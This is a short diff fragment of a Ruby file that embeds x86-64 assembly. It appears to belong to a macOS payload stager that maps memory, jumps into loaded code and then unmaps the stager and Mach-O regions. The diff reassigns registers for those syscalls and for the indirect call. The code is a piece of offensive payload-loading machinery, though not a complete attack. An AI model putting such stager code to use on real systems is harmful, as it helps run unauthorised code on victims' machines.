@@ -41,8 +41,8 @@ MACH_HEADER=<<EOF
   movq $0x1002, %r10
   movl $0x20000c5, %eax
   syscall
-  movq %rax, %r10
-  movq %r10, %r11
+  movq %rax, %r15
+  movq %r15, %r11
 EOF
 assembly << MACH_HEADER
 len = 0
@@ -59,17 +59,19 @@ end
 ASSEMBLY_FOOTER=<<EOF
   pushq $0
 
-  addq $15527, %r14
+  movq $15527, %r11
+  addq %r14, %r11
+  movq %r15, %r10
 
-  callq *%r14
+  callq *%r11
 
-  movq %r10, %r8
-  movq $0x#{stager.size.to_s(16)}, %r9
+  movq %r15, %rdi
+  movq $0x#{stager.size.to_s(16)}, %rsi
   movl $0x2000049, %eax
   syscall
 
-  movq %r14, %r8
-  movq $0x#{macho.size.to_s(16)}, %r9
+  movq %r14, %rdi
+  movq $0x#{macho.size.to_s(16)}, %rsi
   movl $0x2000049, %eax
   syscall
 
